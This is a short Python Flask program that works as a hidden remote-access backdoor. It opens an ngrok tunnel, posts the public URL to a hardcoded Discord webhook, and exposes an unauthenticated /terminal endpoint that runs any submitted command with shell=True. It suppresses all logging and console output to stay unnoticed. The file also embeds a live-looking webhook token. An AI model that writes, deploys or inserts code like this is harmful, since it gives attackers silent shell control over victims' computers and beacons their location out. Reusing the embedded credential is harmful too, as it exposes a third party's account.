import subprocess
import requests
import time
import logging
import sys
import os
from flask import Flask, request, jsonify


log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)


app = Flask(__name__)


DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1312861190506156063/0TUQmzQWViN1XHXc5RBBBLwzZIL0YlkvuFZR1SwHYdFcI-tZ3lOO3RlgVN9svBBm38Ze'


def get_ngrok_url():
    ngrok_process = subprocess.Popen(['ngrok', 'http', '5000'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    time.sleep(3)
    

    try:

        response = requests.get('http://localhost:4040/api/tunnels')
        data = response.json()
        public_url = data['tunnels'][0]['public_url']
        return public_url
    except Exception:
        return None


def send_to_discord(url):
    data = {
        "content": f"URL: {url}"
    }
    try:
        requests.post(DISCORD_WEBHOOK_URL, json=data)
    except Exception:
        pass


@app.route("/connect", methods=["POST"])
def connect():
    data = request.get_json()
    if 'message' in data and data['message'] == 'Connected':
        return jsonify({"status": "Success", "message": "Successfully connected"}), 200
    return jsonify({"status": "Failure", "message": "Connection failed"}), 400


@app.route("/terminal", methods=["POST"])
def terminal():
    data = request.get_json()
    if 'command' in data:
        command = data['command']
        try:

            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            return jsonify({"output": output}), 200
        except Exception:
            return jsonify({"error": "Command execution failed"}), 400
    return jsonify({"error": "No command provided"}), 400


@app.route('/')
def home():
    return "", 200  


def run_flask():
    sys.stdout = open(os.devnull, 'w')  
    sys.stderr = open(os.devnull, 'w') 
    app.run(debug=False, port=5000, use_reloader=False, host="0.0.0.0")

if __name__ == "__main__":
    ngrok_url = get_ngrok_url()
    
    if ngrok_url:
        send_to_discord(ngrok_url)
    
    run_flask()
